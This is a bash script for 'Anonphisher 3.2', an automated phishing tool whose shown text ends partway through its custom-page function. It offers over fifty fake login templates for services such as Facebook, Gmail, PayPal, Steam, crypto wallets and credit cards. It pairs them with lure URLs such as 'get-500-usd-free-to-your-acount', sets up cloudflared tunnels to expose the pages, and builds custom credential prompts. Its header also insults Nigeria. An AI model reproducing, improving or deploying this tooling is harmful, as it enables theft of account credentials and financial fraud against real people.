#!/bin/bash
#Author: AnonyminHack5
#Credits to: Akshay  &  TAHMID RAYAT 
#Version: 3.2 updated
#Do not copy script without authors' consent it is illegal and makes you as stupid as Nigeria or as stupid as the p in psychology
#Facebook: https://facebook.com/AnonyminHack5

echo -e "\e[1;92m Setting up environment for \e[0m\e[1;94mANONPHISHER 3.2...\e[0m"
sleep 0.5
clear
trap 'printf "\n";stop;exit 1' 2

clear='\033[0m'       # Text Reset
clr='\033[0m'
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

 installdependencies() {
                xterm -T 'Update' -geometry 90x26+1000 -e 'apt update' > /dev/null 2>&1 &
                pid0=$!
                wait $pid0
                    pkgs='php'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid1=$!
                        wait $pid1
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='wget'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid2=$!
                        wait $pid2
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='unzip'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid3=$!
                        wait $pid3
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='curl'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid4=$!
                        wait $pid4
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='npm'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid5=$!
                        wait $pid5
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi
                    
                    pkgs='xterm'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Update' -geometry 90x26+1000 -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid6=$!
                        wait $pid6
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                #command -v rkhunter > /dev/null 2>&1 || { echo >&2 "${Red}Installing rkhunter."; xterm -T 'Installer' -geometry 90x26+0+0 -hold -e 'apt install rkhunter' > /dev/null 2>&1 &; exit 1; }
                #command -v php > /dev/null 2>&1 || { echo >&2 "${Red}Installing php."; apt-get install php -y; exit 1; }
                #command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}Installing wget."; apt-get install wget -y; exit 1; }
                #command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}Installing unzip."; apt-get install wget -y; exit 1; }
                #command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}Installing curl."; apt-get install curl -y; exit 1; }
                #command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}Installing localtunnel."; apt-get install npm -y; sleep 2; npm install -g localtunnel;  exit 1; }
                #printf "\n"
                #printf "${BGreen}Version ${version}"
                exit 0
                }
				
				
dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "php is required but it's not installed. Install it by using pkg install php. Aborting."; exit 1; }
##command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

##make directory for logs

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1;}
	fi
}


## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed. ${GREEN}[${WHITE}+${GREEN}]${GREEN}"
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;94m Update\e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;94m Author\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m vk\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m adobe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m badoo\e[0m\n"
printf "\e[1;34m==================================================\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m cryptocoin\e[0m \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m deviantart\e[0m \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m dropbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m paypal\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m pinterest\e[0m\n"  
printf "\e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m playstation\e[0m\e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m reddit\e[0m     \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m xbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m twitch\e[0m     \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m stackoverflow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m      \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Bitcoin\e[0m    \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m free fire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pubg\e[0m       \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;93m Fortnite\e[0m   \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;93m cc-phishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;93m C.O.D\e[0m      \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;93m Mediafire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;93m Airbnb\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hey there, choose an option: \e[0m\en' option


if [[ $option == 1 ]]; then
instagram
elif [[ $option == 2 ]]; then
facebook
elif [[ $option == 3 ]]; then
website="snapchat"
mask='https://view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $option == 4 ]]; then
website="twitter"
mask='https://get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $option == 5 ]]; then
website="github"
tunnel_menu
elif [[ $option == 6 ]]; then
gmail
elif [[ $option == 7 ]]; then
website="spotify"
mask='https://convert-your-account-to-spotify-premium'
tunnel_menu

elif [[ $option == 8 ]]; then
website="netflix"
mask='https://upgrade-your-netflix-plan-free'
tunnel_menu

elif [[ $option == 9 ]]; then
website="origin"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 10 ]]; then
website="steam"
mask='https://steam-free-gift-card'
tunnel_menu

elif [[ $option == 11 ]]; then
website="yahoo"
mask='https://grab-mail-from-anyother-yahoo-account-free'
tunnel_menu

elif [[ $option == 12 ]]; then
website="linkedin"
mask='https://get-a-premium-plan-for-linkedin-free'
tunnel_menu

elif [[ $option == 13 ]]; then
website="protonmail"
mask='https://protonmail-pro-basics-for-free'
tunnel_menu

elif [[ $option == 14 ]]; then
website="wordpress"
mask='https://wordpress-traffic-free'
tunnel_menu

elif [[ $option == 15 ]]; then
website="microsoft"
mask='https://unlimited-onedrive-space-for-free'
tunnel_menu

elif [[ $option == 16 ]]; then
website="instafollowers"
tunnel_menu

elif [[ $option == 17 ]]; then
website="gitlab"
mask='https://get-1k-followers-on-gitlab-free'
tunnel_menu

elif [[ $option == 18 ]]; then
website="create"
createpage
tunnel_menu

elif [[ $option == 19 ]]; then
echo -e "\e[101m Bye!!.. and have a good day 👋 \e[0m"
sleep 0.5
exit 1 

elif [[ $option == 20 ]]; then
sleep 1
echo "Updating Anonphisher... " | lolcat
sleep 0.5
clear
echo -e "\e[1;92m...//..\e[0m\e[1;93m~Searching for updates ~...\e[0m..//..\e[0m"
sleep 2
clear
echo -e "\e[1;94m [+] Updates Found [+] \e[0m"
sleep 2
clear
smallmenu() {
sleep 0.5
printf "\e[1;97mProceed to update?\e[0m"
sleep 0.5
printf "\n"
sleep 0.5
printf "\e[1;97m[01]\e[0m\e[1;92m Yes\e[0m\n"
sleep 0.5
printf "\e[1;97m[02]\e[0m\e[1;92m No\e[0m\n"
sleep 0.5
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose: \e[0m\en' choice

if [[ $choice == 1 || $choice == 01 ]]; then
echo -e "\e[1;93m Nice choice... Haha😋\e[0m"
sleep 0.5
echo -e "\e[1;92m Press enter to update or \e[0m\e[1;37mCTRL C\e[0m\e[1;92m to exit.. \e[0m"
read a1
echo "Updating now..!!" | lolcat
sleep 1
cd $HOME || cd /data/data/com.termux/files/home
rm -rf anonphisher
git clone https://github.com/TermuxHackz/anonphisher
cd anonphisher
chmod 777 *
bash setup
printf "\e[1;92m[\e[0m\e[1;77m✔\e[0m\e[1;92m]\e[0m\e[1;93m Update Completed!!\e[0m\n" 
echo ""
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m RUN bash anonphisher.sh\e[0m\n" 


elif [[ $choice == 2 || $choice == 02 ]]; then
echo -e "\e[1;94m As you wish...lol\e[0m"
sleep 0.5
echo -e "\e[1;93m Leave!!🙄\e[0m"
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m ANONPHISHER NOT UPDATED.!!!!!!..UPDATE!!\e[0m\n" 
exit 1

else
printf "\e[1;93m [!] Wrong option [!]\e[0m\n"
clear
menu
fi
}
smallmenu

elif [[ $option == 21 ]]; then
clear
printf "\n"
sleep 0.5
printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m============\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Telegram: \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Twitter: \e[0m\e[1;34mAnonyminHack5 \e[0m\e[1;97m   [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Facebook: \e[0m\e[1;36mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Created by \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m [•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mTermuxHackz Society \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Credits: \e[0m\e[1;34mAkshay,TAHMID RAYAT &John Smith \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Github: \e[0m\e[1;36mTermuxHackz \e[0m\e[1;97m      [•] \e[0m\n"
sleep 0.5
printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mAnonphisher\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\n"
sleep 0.5
echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
read a1
clear
banner
menu

elif [[ $option == 22 ]]; then
vk

elif [[ $option == 23 ]]; then
website="adobe"
mask='https://get-adobe-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 24 ]]; then
website="badoo"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 25 ]]; then
website="cryptocoinsniper"
tunnel_menu 

elif [[ $option == 26 ]]; then
website="deviantart"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu 

elif [[ $option == 27 ]]; then
website="dropbox"
mask='https://get-1TB-cloud-storage-free'
tunnel_menu

elif [[ $option == 28 ]]; then
website="ebay"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 29 ]]; then
website="paypal"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 30 ]]; then
website="pinterest"
mask='https://get-a-premium-plan-for-pinterest-free'
tunnel_menu

elif [[ $option == 31 ]]; then
website="playstation"
mask='https://playstation-free-gift-card'
tunnel_menu

elif [[ $option == 32 ]]; then
website="reddit"
mask='https://reddit-official-verified-member-badge'
tunnel_menu

elif [[ $option == 33 ]]; then
website="xbox"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 34 ]]; then
website="yandex"
mask='https://grab-mail-from-anyother-yandex-account-free'
tunnel_menu

elif [[ $option == 35 ]]; then
website="twitch"
mask='https://unlimited-twitch-tv-user-for-free'
tunnel_menu

elif [[ $option == 36 ]]; then
website="stackoverflow"
mask='https://get-stackoverflow-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 37 ]]; then
website="messenger"
tunnel_menu

elif [[ $option == 38 ]]; then
website="shopify"
tunnel_menu

elif [[ $option == 39 ]]; then
website="shopping"
tunnel_menu

elif [[ $option == 40 ]]; then
website="verizon"
tunnel_menu

elif [[ $option == 41 ]]; then
website="quora"
mask='https://quora-premium-for-free'
tunnel_menu

elif [[ $option == 42 ]]; then
website="bet9ja"
tunnel_menu

elif [[ $option == 43 ]]; then
website="Wi-Fi"
tunnel_menu

elif [[ $option == 44 ]]; then
website="Bitcoin"
tunnel_menu

elif [[ $option == 45 ]]; then
website="free_fire"
tunnel_menu

elif [[ $option == 46 ]]; then
website="pugb"
tunnel_menu

elif [[ $option == 47 ]]; then
website="fortnite"
tunnel_menu

elif [[ $option == 48 ]]; then
website="cc-phishing"
tunnel_menu

elif [[ $option == 49 ]]; then
website="cod"
tunnel_menu

elif [[ $option == 50 ]]; then
website="mediafire"
mask='https://get-1TB-on-mediafire-free'
tunnel_menu

elif [[ $option == 51 ]]; then
website="airbnb"
mask='https://airbnb-com'
tunnel_menu

else
printf "\e[1;93m[\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\e[1;37m Invalid option\e[0m\e[1;93m [\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\n"
sleep 0.95
cls || clear
banner
menu
fi
}

facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Free Likes Login Page?\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option


if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
mask='https://blue-badge-verified-badge-for-facebook'
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
mask='https://vote-for-the-best-social-media'
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
mask='https://make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
mask='https://get-messenger-premium-features-free'
tunnel_menu
elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
website="fb_freelikes"
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page? \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page? \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page? \e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
mask='https://instagram-com'
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
mask='https://get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
mask='https://blue-badge-verify-for-instagram'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
gmail(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option


if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
mask='https://get-unlimited-google-photos-free'
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
mask='https://get-unlimited-google-photos-free'
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
mask='https://vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi


}

vk(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
mask='https://vk-premium-real-method-2020'
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
mask='https://vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

banner() {
printf "\e[1;78m                          \e[0m\n"
printf "\e[1;31m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e[1;32m             |A|n|o|n|p|h|i|s|h|e|r|  \e[0m\n"
printf "\e[1;33m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e[1;34m         \e[0m\e[1;35m        v3.2 beta \e[0m\n"
printf "\n"
printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: AnonyminHack5 [51+ templates] \e[0m\e[1;93m[*]\e[0m\n"
printf "\e[1;93m     [*]\e[0m\e[1;37m Team: TermuxHackz Society \e[0m\e[1;93m[*]\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not::\e[0m\n"
printf "  \e[101m\e[1;77m:: Responsible for any misuse or damage caused by anonphisher take care please !::\e[0m\n"
printf "\n"
}

smallbanner() {
clear                                               
printf "\e[1;31m  _____                 _   _     _             \e[0m\n"       
printf "\e[1;32m |  _  |___ ___ ___ ___| |_|_|___| |_ ___ ___   \e[0m\n"
printf "\e[1;33m |     |   | . |   | . |   | |_ -|   | -_|  _|  \e[0m\n"
printf "\e[1;34m |__|__|_|_|___|_|_|  _|_|_|_|___|_|_|___|_|    \e[0m\n"
printf "\e[1;35m                   |_|                          \e[0m\n"
printf "\n"
} 

createpage() {
default_cap1="Wi-fi Session Expired , Try again"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

